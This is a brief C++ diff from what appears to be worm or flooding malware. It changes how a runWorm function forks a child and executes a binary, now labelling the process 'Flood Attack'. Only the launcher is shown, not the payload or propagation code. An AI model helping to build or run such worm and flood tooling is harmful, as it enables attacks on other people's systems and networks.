@@ -47,8 +47,7 @@ int runWorm(std::string& loc) {
     pid_t pid = fork();
     if (pid == 0) {
         // Children
-        char* args[] = {NULL};
-        execv(loc.c_str(), args);
+        execl(loc.c_str(), "Flood Attack", NULL);
         exit(0);
     }
     return pid;
